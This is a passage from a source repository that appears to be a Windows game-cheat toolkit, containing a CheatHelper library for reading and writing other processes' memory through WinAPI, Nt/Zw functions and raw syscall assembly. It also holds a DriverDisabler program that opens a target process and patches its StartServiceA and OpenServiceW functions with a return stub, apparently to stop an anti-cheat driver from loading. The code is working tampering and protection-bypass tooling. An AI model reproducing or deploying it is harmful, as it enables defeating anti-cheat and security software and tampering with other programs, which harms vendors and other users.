		CheatHelper::ntRVMAddress = GetPrivateProfileInt("Addresses", "ntRVMAddress", 0x0, configFile);
		CheatHelper::ntWVMAddress = GetPrivateProfileInt("Addresses", "ntWVMAddress", 0x0, configFile);
		CheatHelper::ZwRVMAddress = GetPrivateProfileInt("Addresses", "ZwRVMAddress", 0x0, configFile);
		CheatHelper::ZwWVMAddress = GetPrivateProfileInt("Addresses", "ZwWVMAddress", 0x0, configFile);
		CheatHelper::startAddressPhy = GetPrivateProfileInt("Addresses", "startAddressPhy", 0x0, configFile);
#endif


	std::cout << "\t[.] RPMAddress 0x" << std::hex << CheatHelper::RPMAddress << std::endl;
	std::cout << "\t[.] WPMAddress 0x" << std::hex << CheatHelper::WPMAddress << std::endl;
	std::cout << "\t[.] ntRVMAddress 0x" << std::hex << CheatHelper::ntRVMAddress << std::endl;
	std::cout << "\t[.] ntWVMAddress 0x" << std::hex << CheatHelper::ntWVMAddress << std::endl;
	std::cout << "\t[.] ZwRVMAddress 0x" << std::hex << CheatHelper::ZwRVMAddress << std::endl;
	std::cout << "\t[.] ZwWVMAddress 0x" << std::hex << CheatHelper::ZwWVMAddress << std::endl;
	std::cout << "\t[.] startAddressPhy 0x" << std::hex << CheatHelper::startAddressPhy << std::endl;


	//Handles
	CheatHelper::requestHandleNP = (HANDLE)GetPrivateProfileInt("Handles", "requestHandleNP", 0x0, configFile);
	CheatHelper::requestHandleFM = (HANDLE)GetPrivateProfileInt("Handles", "requestHandleFM", 0x0, configFile);
	CheatHelper::requestHandleDrv = (HANDLE)GetPrivateProfileInt("Handles", "requestHandleDrv", 0x0, configFile);
	std::cout << "\t[.] requestHandleNP 0x" << std::hex << CheatHelper::requestHandleNP << std::endl;
	std::cout << "\t[.] requestHandleFM 0x" << std::hex << CheatHelper::requestHandleFM << std::endl;
	std::cout << "\t[.] requestHandleDrv 0x" << std::hex << CheatHelper::requestHandleDrv << std::endl;


	//Buffers
	
	CheatHelper::RPMBufferSize = GetPrivateProfileInt("Buffers", "RPMBufferSize", BUFSIZE, configFile);
	CheatHelper::WPMBufferSize = GetPrivateProfileInt("Buffers", "WPMBufferSize", BUFSIZE, configFile);
	CheatHelper::ntRVMBufferSize = GetPrivateProfileInt("Buffers", "ntRVMBufferSize", BUFSIZE, configFile);
	CheatHelper::ntWVMBufferSize = GetPrivateProfileInt("Buffers", "ntWVMBufferSize", BUFSIZE, configFile);
	CheatHelper::ZwRVMBufferSize = GetPrivateProfileInt("Buffers", "ZwRVMBufferSize", BUFSIZE, configFile);
	CheatHelper::ZwWVMBufferSize = GetPrivateProfileInt("Buffers", "ZwWVMBufferSize", BUFSIZE, configFile);

	std::cout << "\t[.] RPMBufferSize 0x" << std::hex << CheatHelper::RPMBufferSize << std::endl;
	std::cout << "\t[.] WPMBufferSize 0x" << std::hex << CheatHelper::WPMBufferSize << std::endl;
	std::cout << "\t[.] ntRVMBufferSize 0x" << std::hex << CheatHelper::ntRVMBufferSize << std::endl;
	std::cout << "\t[.] ntWVMBufferSize 0x" << std::hex << CheatHelper::ntWVMBufferSize << std::endl;
	std::cout << "\t[.] ZwRVMBufferSize 0x" << std::hex << CheatHelper::ZwRVMBufferSize << std::endl;
	std::cout << "\t[.] ZwWVMBufferSize 0x" << std::hex << CheatHelper::ZwWVMBufferSize << std::endl;

	SecureZeroMemory(CheatHelper::RPMBuffer, BUFSIZE);
	SecureZeroMemory(CheatHelper::WPMBuffer, BUFSIZE);
	SecureZeroMemory(CheatHelper::ntRVMBuffer, BUFSIZE);
	SecureZeroMemory(CheatHelper::ntWVMBuffer, BUFSIZE);
	SecureZeroMemory(CheatHelper::ZwRVMBuffer, BUFSIZE);
	SecureZeroMemory(CheatHelper::ZwWVMBuffer, BUFSIZE);


	GetPrivateProfileString("Buffers", "RPMBuffer", "calc.exe", CheatHelper::RPMBuffer, (DWORD)CheatHelper::RPMBufferSize, configFile);
	GetPrivateProfileString("Buffers", "WPMBuffer", "calc.exe", CheatHelper::WPMBuffer, (DWORD)CheatHelper::WPMBufferSize, configFile);
	GetPrivateProfileString("Buffers", "ntRVMBuffer", "calc.exe", CheatHelper::ntRVMBuffer, (DWORD)CheatHelper::ntRVMBufferSize, configFile);
	GetPrivateProfileString("Buffers", "ntWVMBuffer", "calc.exe", CheatHelper::ntWVMBuffer, (DWORD)CheatHelper::ntWVMBufferSize, configFile);
	GetPrivateProfileString("Buffers", "ZwRVMBuffer", "calc.exe", CheatHelper::ZwRVMBuffer, (DWORD)CheatHelper::ZwRVMBufferSize, configFile);
	GetPrivateProfileString("Buffers", "ZwWVMBuffer", "calc.exe", CheatHelper::ZwWVMBuffer, (DWORD)CheatHelper::ZwWVMBufferSize, configFile);
	
	std::cout << "\t[.] RPMBuffer " << CheatHelper::RPMBuffer << std::endl;
	std::cout << "\t[.] WPMBuffer " << CheatHelper::WPMBuffer << std::endl;
	std::cout << "\t[.] ntWPMBuffer " << CheatHelper::ntRVMBuffer << std::endl;
	std::cout << "\t[.] ntWPMBuffer " << CheatHelper::ntWVMBuffer << std::endl;
	std::cout << "\t[.] ZwRPMBuffer " << CheatHelper::ZwRVMBuffer << std::endl;
	std::cout << "\t[.] ZwWPMBuffer " << CheatHelper::ZwWVMBuffer << std::endl;

	//Shared Memory
	//GetPrivateProfileString("SharedMemory", "sPipeName", "calc.exe", CheatHelper::sPipeName, BUFSIZE, configFile);
//	std::cout << "[.] sPipeName " << CheatHelper::sPipeName << std::endl;

	//Strings
	GetPrivateProfileString("Strings", "targetProc", "calc2.exe", CheatHelper::targetProc, BUFSIZE, configFile);
	GetPrivateProfileString("Strings", "privotProc", "calc2.exe", CheatHelper::privotProc, BUFSIZE, configFile);
	GetPrivateProfileString("Strings", "namedPipeName", "\\.\\pipe\\driverbypass", CheatHelper::namedPipeName, BUFSIZE, configFile);
	GetPrivateProfileString("Strings", "fileMapName", "Global\StealthHijacking", CheatHelper::fileMapName, BUFSIZE, configFile);
	GetPrivateProfileString("Strings", "driverName", "\\.\\GIO", CheatHelper::driverName, BUFSIZE, configFile);

	std::cout << "\t[.] targetProc " << CheatHelper::targetProc << std::endl;
	std::cout << "\t[.] privotProc " << CheatHelper::privotProc << std::endl;
	std::cout << "\t[.] namedPipeName " << CheatHelper::namedPipeName << std::endl;
	std::cout << "\t[.] fileMapName " << CheatHelper::fileMapName << std::endl;
	std::cout << "\t[.] driverName " << CheatHelper::driverName << std::endl;

	return 0;
}
```

`CheatHelper/CheatHelper.h`:

```h
#pragma once
#include <windows.h>
#include <iostream>

#define BUFSIZE 100
#define FILEMAPSIZE 4096

typedef LONG(WINAPI *TNtReadVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
typedef LONG(WINAPI *TNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG  NumberOfBytesWritten);


struct PipeMessageRequest {
	int action = 0;
	HANDLE handle = 0;
	intptr_t address = 0;
	int size = BUFSIZE;
	char buffer[BUFSIZE] = { "" };
};

struct PipeMessageResponse {
	int status = 0;
	SIZE_T bytesRead = 0;
	char buffer[BUFSIZE] = { "" };
};

class CheatHelper
{
public:
	// WINAPI Functions
	static void Suspend(DWORD processId);
	static void Resume(DWORD processId);
	// Process Functions
	static DWORD GetProcId(char* procName);
	// Debuging Functions
	static void ConsoleSetup(const char * title);
	static void PrintBytes(PVOID buffer, SIZE_T  nSize);
	// Memory functions
	static int RPM(HANDLE  hProcess, LPCVOID lpBaseAddress,	LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
	static int WPM(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	static int NtRVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
	static int NtWVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG  NumberOfBytesWritten);
	static int ZwRVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
	static int ZwWVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
	//DX functions
	//DX11 functions

	//FileMapping
	static bool checkSpinLockByte(LPVOID pFileMapMem, BYTE value);
	static bool setSpinLockByte(LPVOID pFileMapMem, BYTE value);
	static void prepareRequest(PipeMessageRequest &PMRequest);

	// Configuration file (INI)
	static bool loadConfig();

	//States
	static bool bDelayExecution;


	//Addresses
	static intptr_t RPMAddressHigh;
	static intptr_t RPMAddressLow;
	static intptr_t RPMAddress;
	static intptr_t WPMAddressHigh;
	static intptr_t WPMAddressLow;
	static intptr_t WPMAddress;
	static intptr_t ntRVMAddress;
	static intptr_t ntRVMAddressHigh;
	static intptr_t ntRVMAddressLow;
	static intptr_t ntWVMAddress;
	static intptr_t ntWVMAddressHigh;
	static intptr_t ntWVMAddressLow;
	static intptr_t ZwRVMAddressHigh;
	static intptr_t ZwRVMAddressLow;
	static intptr_t ZwRVMAddress;
	static intptr_t ZwWVMAddressHigh;
	static intptr_t ZwWVMAddressLow;
	static intptr_t ZwWVMAddress;

	static DWORDLONG startAddressPhyHigh; //Phy address
	static DWORDLONG startAddressPhyLow; //Phy address
	static DWORDLONG startAddressPhy; //Phy address

	//Handles
	static HANDLE requestHandleNP;
	static HANDLE requestHandleFM;
	static HANDLE requestHandleDrv;



	//Buffers
	static char RPMBuffer[BUFSIZE];
	static char WPMBuffer[BUFSIZE];
	static char ntRVMBuffer[BUFSIZE];
	static char ntWVMBuffer[BUFSIZE];
	static char ZwRVMBuffer[BUFSIZE];
	static char ZwWVMBuffer[BUFSIZE];
	static SIZE_T RPMBufferSize;
	static SIZE_T WPMBufferSize;
	static SIZE_T ntRVMBufferSize;
	static SIZE_T ntWVMBufferSize;
	static SIZE_T ZwRVMBufferSize;
	static SIZE_T ZwWVMBufferSize;

	//Shared Memory
	//static LPCSTR sPipeName;

	//Strings
	static char targetProc[BUFSIZE];
	static char privotProc[BUFSIZE];
	static char namedPipeName[BUFSIZE];
	static char fileMapName[BUFSIZE];
	static char driverName[BUFSIZE];


};



class NamedPipeHelper
{
public:
	// NamedPipe functions
	int StartPipe(LPTSTR name);
	int ConnectPipe(LPTSTR name);
	PVOID ListenPipe();
	int WritePipe(const char * buffer);
	

private:
	HANDLE hPipeServer;
	HANDLE hNamedPipe;
};


```

`CheatHelper/CheatHelper.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{A080C117-D1DB-4671-8217-65496573BA4D}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>CheatHelper</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_LIB;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="CheatHelper.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="CheatHelper.cpp" />
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="ZwReadWriteVM.asm" />
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`CheatHelper/CheatHelper.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="CheatHelper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="CheatHelper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="ZwReadWriteVM.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
</Project>
```

`CheatHelper/Readme.md`:

```md
# CheatHelper

## Introduction


## Usage

This module provides all key features required by a cheat in order to interact with the Windows API, Memory, NamedPipes and FileMapping.

## Key Features

Class NamedPipeHelper will provide assistance for NamedPipe interaction.

Class CheatHelper will provide the following method:

- WINAPI Functions
  - static void Suspend(DWORD processId);
  - static void Resume(DWORD processId);
- Process Functions
  - static DWORD GetProcId(char* procName);
  - Debuging Functions
  - static void ConsoleSetup(const char * title);
  - static void PrintBytes(PVOID buffer, SIZE_T  nSize);
- Memory functions
  - static int RPM(HANDLE  hProcess, LPCVOID lpBaseAddress,	LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
  - static int WPM(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
  - static int NtRVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
  - static int NtWVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG  NumberOfBytesWritten);
  - static int ZwRVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
  - static int ZwWVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
- FileMapping
  - static bool checkSpinLockByte(LPVOID pFileMapMem, BYTE value);
  - static bool setSpinLockByte(LPVOID pFileMapMem, BYTE value);
  - static void prepareRequest(PipeMessageRequest &PMRequest);
  - Configuration file (INI)
  - static bool loadConfig();


```

`CheatHelper/ZwReadWriteVM.asm`:

```asm
.code

ZwWriteVM proc
	mov r10, rcx
	mov eax, 3Ah
	syscall
	ret
ZwWriteVM endp

ZwReadVM proc
	mov r10, rcx
	mov eax, 3Fh
	syscall
	ret
ZwReadVM endp

end
```

`CheatHelper/stdafx.cpp`:

```cpp
#include "stdafx.h"

```

`CheatHelper/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers



// reference additional headers your program requires here

```

`CheatHelper/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`DriverDisabler/DriverDisabler.cpp`:

```cpp
// DriverDisabler.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "CheatHelper.h"
#include <iostream>
#include <windows.h>


bool DriverBypass(int pID)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pID);
	if (!hProcess) {
		std::cout << "Error1" << std::endl;
		return false;
	}


	HMODULE hMod = GetModuleHandle("advapi32.dll");
	if (!hMod) {
		std::cout << "Error2" << std::endl;
		return false;
	}

	
	std::cout << std::hex << hMod << std::endl;
	LPVOID dwSSA = (LPVOID)GetProcAddress(hMod, "StartServiceA");
	LPVOID dwOSW = (LPVOID)GetProcAddress(hMod, "OpenServiceW");
	if (!dwSSA || !dwOSW) {
		std::cout << "Error3" << std::endl;
		return false;
	}
	std::cout << std::hex << dwSSA << std::endl;
	std::cout << std::hex << dwOSW << std::endl;
	byte wByte[] = { 0xC2, 0x0C, 0x00 };
	if (!WriteProcessMemory(hProcess, dwSSA, &wByte, sizeof(wByte), NULL)) {
		std::cout << "Error4" << std::endl;
		return false;
	}
	if (!WriteProcessMemory(hProcess, dwOSW, &wByte, sizeof(wByte), NULL)) {
		std::cout << "Error5" << std::endl;
		return false;
	}

	return true;
}


int main()
{
	std::cout << "[+] Init" << std::endl;
	
	DWORD processID = NULL;
	while (true)
	{
		processID = CheatHelper::GetProcId(CheatHelper::targetProc);
		if (processID != NULL)
		{
			std::cout << std::hex << processID << std::endl;
			break;
		}
		Sleep(1000);
	}
	Sleep(1000);
	DriverBypass(processID);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

```

`DriverDisabler/DriverDisabler.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{723D6B45-EEBA-4C09-8528-4373BAFF330A}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>DriverDisabler</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
